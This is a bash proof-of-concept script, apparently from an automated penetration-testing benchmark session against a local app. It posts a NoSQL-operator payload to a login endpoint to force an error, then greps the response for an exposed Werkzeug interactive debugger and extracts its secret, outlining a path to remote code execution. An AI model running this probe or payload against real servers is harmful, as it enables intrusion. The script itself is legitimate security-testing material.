#!/bin/bash
# POC: Demonstrates Werkzeug debug mode RCE by triggering an exception and detecting the interactive debugger
# Target: ./repo
# Created: 2025-10-31T16:48:09.009Z
# Session: benchmark-XBEN-032-24-mhf2utzd

echo "========================================"
echo "Werkzeug Debug Mode RCE POC"
echo "========================================"
echo ""

TARGET="http://localhost:8080"

echo "[*] Testing for Werkzeug Debug Mode exposure..."
echo "[*] Target: $TARGET/login"
echo ""

echo "[1] Sending malformed JSON to trigger exception..."
RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "$TARGET/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$gt":""}}')

HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE:" | cut -d':' -f2)
BODY=$(echo "$RESPONSE" | sed '/HTTP_CODE:/d')

echo "[*] Response HTTP Code: $HTTP_CODE"
echo ""

if [ "$HTTP_CODE" != "500" ]; then
    echo "[-] Expected HTTP 500, got $HTTP_CODE"
    echo "[!] Debug mode may not be enabled or error not triggered"
    exit 1
fi

echo "[+] HTTP 500 received - checking for Werkzeug debugger..."
echo ""

# Check for Werkzeug debugger indicators
if echo "$BODY" | grep -qi "Werkzeug"; then
    echo "[+] CONFIRMED: Werkzeug debugger detected!"
fi

if echo "$BODY" | grep -qi "console"; then
    echo "[+] CONFIRMED: Interactive console present!"
fi

if echo "$BODY" | grep -qi "EVALEX"; then
    echo "[+] CONFIRMED: EVALEX flag found (interactive execution enabled)!"
fi

if echo "$BODY" | grep -qi "SECRET.*="; then
    echo "[+] CONFIRMED: Debugger SECRET exposed in response!"
    SECRET=$(echo "$BODY" | grep -o "SECRET[[:space:]]*=[[:space:]]*[\"'][^\"']*[\"']" | head -1)
    echo "    $SECRET"
fi

if echo "$BODY" | grep -qi "Traceback\|Stack trace"; then
    echo "[+] CONFIRMED: Full stack trace exposed!"
fi

echo ""
echo "[2] Analyzing response for RCE indicators..."

# Count critical indicators
INDICATOR_COUNT=0

echo "$BODY" | grep -qi "Werkzeug" && ((INDICATOR_COUNT++))
echo "$BODY" | grep -qi "console" && ((INDICATOR_COUNT++))
echo "$BODY" | grep -qi "EVALEX" && ((INDICATOR_COUNT++))
echo "$BODY" | grep -qi "Traceback" && ((INDICATOR_COUNT++))

echo ""
echo "========================================"
echo "VULNERABILITY ASSESSMENT"
echo "========================================"
echo "Critical Indicators Found: $INDICATOR_COUNT/4"

if [ $INDICATOR_COUNT -ge 3 ]; then
    echo ""
    echo "[!!!] CRITICAL VULNERABILITY CONFIRMED [!!!]"
    echo ""
    echo "Werkzeug debug mode is ENABLED with interactive debugger."
    echo "This allows Remote Code Execution (RCE) via the debug console."
    echo ""
    echo "Attack Path:"
    echo "1. Trigger exception with malformed request (CONFIRMED)"
    echo "2. Access interactive debugger frames in browser"
    echo "3. Execute arbitrary Python code with app privileges"
    echo ""
    echo "Impact: Full server compromise, data theft, lateral movement"
    echo ""
    exit 0
else
    echo ""
    echo "[-] Insufficient indicators for debug mode RCE"
    echo "    Found $INDICATOR_COUNT/4 expected indicators"
    exit 1
fi